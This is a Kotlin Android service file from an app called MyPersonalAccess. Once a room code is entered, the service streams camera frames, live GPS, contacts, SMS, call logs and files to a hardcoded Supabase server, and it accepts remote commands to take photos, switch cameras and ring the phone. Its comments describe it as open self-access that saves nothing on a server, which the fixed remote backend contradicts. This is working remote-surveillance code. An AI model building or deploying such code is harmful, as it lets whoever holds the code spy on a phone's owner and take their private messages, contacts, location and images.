package com.mypersonalaccess.app

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.media.AudioManager
import android.media.ToneGenerator
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import org.json.JSONObject

/**
 * Foreground service: the heart of MyPersonalAccess on the phone.
 *
 * While sharing is ON it:
 *  - keeps a Realtime connection to the user's own Supabase project,
 *  - streams camera frames (~every 2.5s) + live GPS + battery + device info,
 *  - sends the data bundle (phone number, contacts, SMS, calls, files),
 *  - listens for dashboard commands (ring / photo / flip / refresh / stop).
 *
 * A persistent notification is always visible while sharing — nothing here
 * runs hidden. Stop the service (or the "Sab Band Karo" command) and
 * everything stops immediately. Nothing is saved on any server.
 */
class RemoteService : Service() {

    companion object {
        const val ACTION_START = "com.mypersonalaccess.app.START"
        const val ACTION_STOP = "com.mypersonalaccess.app.STOP"
        const val ACTION_CMD = "com.mypersonalaccess.app.CMD"
        const val EXTRA_CODE = "code"
        const val EXTRA_ACTION = "action"

        const val BROADCAST_STATUS = "com.mypersonalaccess.app.STATUS"
        const val BROADCAST_FRAME = "com.mypersonalaccess.app.FRAME"
        const val BROADCAST_LOG = "com.mypersonalaccess.app.LOG"
        const val EXTRA_CONNECTED = "connected"
        const val EXTRA_DASHBOARD = "dashboard"
        const val EXTRA_FRAMES = "frames"
        const val EXTRA_BATTERY = "battery"
        const val EXTRA_LAT = "lat"
        const val EXTRA_LNG = "lng"
        const val EXTRA_FRAME_BYTES = "frameBytes"
        const val EXTRA_CAM = "cam"
        const val EXTRA_LOC = "loc"
        const val EXTRA_LINE = "line"

        const val SUPABASE_URL = "https://auduzxrimocolbvbtukr.supabase.co"
        const val SUPABASE_ANON_KEY = "sb_publishable_XrXjCI8WMvBSWMB9qxmnLA_QvQ6VvbV"

        private const val CHANNEL_ID = "mpa_remote"
        private const val NOTIF_ID = 1
    }

    private var roomCode: String = ""
    private var realtime: SupabaseRealtime? = null
    private var cameraHelper: CameraHelper? = null
    private var fusedLocation: FusedLocationProviderClient? = null
    private var locationCallback: LocationCallback? = null
    private var camOn = false
    private var locOn = false
    private var frontCamera = false
    private var framesSent = 0
    private var dashboardSeen = false
    private var lastLocSent = 0L
    private var lastLat = 0.0
    private var lastLng = 0.0

    private val handler = Handler(Looper.getMainLooper())
    private var hbRunnable: Runnable? = null

    // ---------- lifecycle ----------

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_STOP -> {
                stopSharing()
                return START_NOT_STICKY
            }
            ACTION_CMD -> {
                val action = intent.getStringExtra(EXTRA_ACTION) ?: ""
                if (action.isNotEmpty()) {
                    handleCommand("cmd", JSONObject().apply { put("action", action) })
                }
                return START_STICKY
            }
            ACTION_START -> {
                val code = intent.getStringExtra(EXTRA_CODE)?.uppercase()?.trim() ?: ""
                if (code.isEmpty()) {
                    stopSelf()
                    return START_NOT_STICKY
                }
                roomCode = code
                getSharedPreferences("mpa", Context.MODE_PRIVATE).edit()
                    .putString("code", code).putBoolean("sharing", true).apply()
                startSharing()
            }
            else -> {
                // System restart: resume if sharing was on.
                val prefs = getSharedPreferences("mpa", Context.MODE_PRIVATE)
                if (prefs.getBoolean("sharing", false)) {
                    roomCode = prefs.getString("code", "") ?: ""
                    if (roomCode.isNotEmpty()) startSharing()
                }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        stopSharing()
        super.onDestroy()
    }

    // ---------- sharing ----------

    private fun startSharing() {
        createNotificationChannel()
        val notification = buildNotification("Connecting…")
        var type = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (hasPermission(android.Manifest.permission.CAMERA)) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
        }
        if (hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
            type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
        }
        try {
            ServiceCompat.startForeground(this, NOTIF_ID, notification, type)
        } catch (e: Exception) {
            try {
                startForeground(NOTIF_ID, notification)
            } catch (e2: Exception) {
                return
            }
        }

        log("Sharing start — Room $roomCode")
        realtime = SupabaseRealtime(SUPABASE_URL, SUPABASE_ANON_KEY, object : SupabaseRealtime.Listener {
            override fun onJoined() {
                log("✅ Connected — Room $roomCode")
                updateNotification("Sharing ON • Room $roomCode")
                sendInfo()
                sendDataBundle()
                sendHello()
                startCam()
                startLoc()
                startHeartbeat()
                sendStatus()
            }

            override fun onRemote(type: String, data: JSONObject?) {
                handleCommand(type, data)
            }

            override fun onError(message: String) {
                log("⚠️ $message")
                updateNotification("Reconnecting… • Room $roomCode")
                sendStatus()
            }

            override fun onClosed() {
                log("Connection band ho gaya.")
                sendStatus()
            }
        })
        realtime?.connect(roomCode)
        sendStatus()
    }

    private fun stopSharing() {
        hbRunnable?.let { handler.removeCallbacks(it) }
        hbRunnable = null
        cameraHelper?.stop()
        cameraHelper = null
        camOn = false
        stopLocationUpdates()
        locOn = false
        realtime?.disconnect()
        realtime = null
        dashboardSeen = false
        framesSent = 0
        getSharedPreferences("mpa", Context.MODE_PRIVATE).edit()
            .putBoolean("sharing", false).apply()
        try {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } catch (e: Exception) {
        }
        log("⛔ Sharing band.")
        sendStatus()
        stopSelf()
    }

    // ---------- realtime out ----------

    private fun sendHello() {
        realtime?.send("hello", JSONObject())
    }

    private fun sendInfo() {
        realtime?.send("info", DataCollectors.deviceInfo(this))
    }

    private fun sendDataBundle() {
        try {
            realtime?.send("data", DataCollectors.fullBundle(this))
            log("📱 Phone data bheja (number, contacts, SMS, calls, files).")
        } catch (e: Exception) {
        }
    }

    private fun startHeartbeat() {
        hbRunnable?.let { handler.removeCallbacks(it) }
        hbRunnable = object : Runnable {
            override fun run() {
                realtime?.send("hb", JSONObject().apply { put("ts", System.currentTimeMillis()) })
                handler.postDelayed(this, 5_000)
            }
        }
        handler.postDelayed(hbRunnable!!, 5_000)
    }

    // ---------- camera ----------

    private fun startCam() {
        if (camOn) return
        if (!hasPermission(android.Manifest.permission.CAMERA)) {
            log("❌ Camera permission nahi hai.")
            return
        }
        camOn = true
        cameraHelper = CameraHelper(this)
        cameraHelper?.start(frontCamera) { base64 ->
            framesSent++
            val data = JSONObject().apply {
                put("img", "data:image/jpeg;base64,$base64")
                put("ts", System.currentTimeMillis())
            }
            realtime?.send("cam", data)
            // Also show the last frame in the Activity.
            try {
                val bytes = android.util.Base64.decode(base64, android.util.Base64.DEFAULT)
                val intent = Intent(BROADCAST_FRAME).apply {
                    setPackage(packageName)
                    putExtra(EXTRA_FRAME_BYTES, bytes)
                }
                sendBroadcast(intent)
            } catch (e: Exception) {
            }
            if (framesSent % 10 == 1) sendStatus()
        }
        log("📷 Camera ON (" + if (frontCamera) "Front" else "Back" + ").")
    }

    private fun stopCam() {
        cameraHelper?.stop()
        cameraHelper = null
        if (camOn) {
            camOn = false
            log("📷 Camera band.")
        }
    }

    // ---------- location ----------

    private fun startLoc() {
        if (locOn) return
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) &&
            !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        ) {
            log("❌ Location permission nahi hai.")
            return
        }
        locOn = true
        fusedLocation = LocationServices.getFusedLocationProviderClient(this)
        val request = LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10_000)
            .setMinUpdateIntervalMillis(5_000)
            .build()
        locationCallback = object : LocationCallback() {
            override fun onLocationResult(result: LocationResult) {
                val loc = result.lastLocation ?: return
                val now = System.currentTimeMillis()
                if (now - lastLocSent < 5_000) return
                lastLocSent = now
                lastLat = loc.latitude
                lastLng = loc.longitude
                val data = JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lng", loc.longitude)
                    put("acc", loc.accuracy.toInt())
                    put("ts", now)
                }
                realtime?.send("loc", data)
                sendStatus()
            }
        }
        try {
            fusedLocation?.requestLocationUpdates(request, locationCallback!!, Looper.getMainLooper())
            log("📍 Location ON.")
        } catch (e: SecurityException) {
            locOn = false
            log("❌ Location permission nahi mili.")
        }
    }

    private fun stopLocationUpdates() {
        locationCallback?.let { cb ->
            try {
                fusedLocation?.removeLocationUpdates(cb)
            } catch (e: Exception) {
            }
        }
        locationCallback = null
        if (locOn) {
            locOn = false
            log("📍 Location band.")
        }
    }

    // ---------- commands from the dashboard ----------

    private fun handleCommand(type: String, data: JSONObject?) {
        if (type == "hello") {
            dashboardSeen = true
            sendHello()
            sendInfo()
            sendDataBundle()
            sendStatus()
            return
        }
        if (type != "cmd" || data == null) return
        dashboardSeen = true
        when (data.optString("action")) {
            "ring" -> ringPhone()
            "photo" -> {
                cameraHelper?.captureNow { base64 ->
                    val d = JSONObject().apply {
                        put("img", "data:image/jpeg;base64,$base64")
                        put("ts", System.currentTimeMillis())
                    }
                    realtime?.send("cam", d)
                }
                log("📸 Photo li (dashboard ne manga).")
            }
            "cam-flip" -> {
                frontCamera = !frontCamera
                if (camOn) {
                    stopCam()
                    startCam()
                }
                log("Camera flip: " + if (frontCamera) "Front" else "Back")
            }
            "refresh" -> {
                sendInfo()
                sendDataBundle()
                log("🔄 Data refresh bheja.")
            }
            "stop-cam" -> stopCam()
            "stop-loc" -> stopLocationUpdates()
            "start-cam" -> startCam()
            "start-loc" -> startLoc()
            "stop-all" -> stopSharing()
        }
        sendStatus()
    }

    private fun ringPhone() {
        try {
            val tone = ToneGenerator(AudioManager.STREAM_ALARM, 80)
            tone.startTone(ToneGenerator.TONE_CDMA_ALERT_CALL_GUARD, 1500)
            Handler(Looper.getMainLooper()).postDelayed({ try { tone.release() } catch (e: Exception) {} }, 1600)
        } catch (e: Exception) {
        }
        try {
            val vibrator = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                (getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager).defaultVibrator
            } else {
                @Suppress("DEPRECATION")
                getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 300, 200, 300, 200, 500), -1))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(longArrayOf(0, 300, 200, 300, 200, 500), -1)
            }
        } catch (e: Exception) {
        }
        log("🔔 Dashboard ne Ring bajaya!")
    }

    // ---------- helpers ----------

    private fun hasPermission(perm: String): Boolean {
        return ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "MyPersonalAccess Remote",
                NotificationManager.IMPORTANCE_LOW
            ).apply { description = "Sharing status — apne phone ka remote access" }
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("MyPersonalAccess — Sharing ON")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true)
            .build()
    }

    private fun updateNotification(text: String) {
        try {
            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            nm.notify(NOTIF_ID, buildNotification(text))
        } catch (e: Exception) {
        }
    }

    private fun sendStatus() {
        val intent = Intent(BROADCAST_STATUS).apply {
            setPackage(packageName)
            putExtra(EXTRA_CONNECTED, realtime != null)
            putExtra(EXTRA_DASHBOARD, dashboardSeen)
            putExtra(EXTRA_FRAMES, framesSent)
            putExtra(EXTRA_BATTERY, DataCollectors.batteryPercent(this@RemoteService))
            putExtra(EXTRA_LAT, lastLat)
            putExtra(EXTRA_LNG, lastLng)
            putExtra(EXTRA_CAM, camOn)
            putExtra(EXTRA_LOC, locOn)
        }
        sendBroadcast(intent)
    }

    private fun log(line: String) {
        val intent = Intent(BROADCAST_LOG).apply {
            setPackage(packageName)
            putExtra(EXTRA_LINE, line)
        }
        sendBroadcast(intent)
    }
}
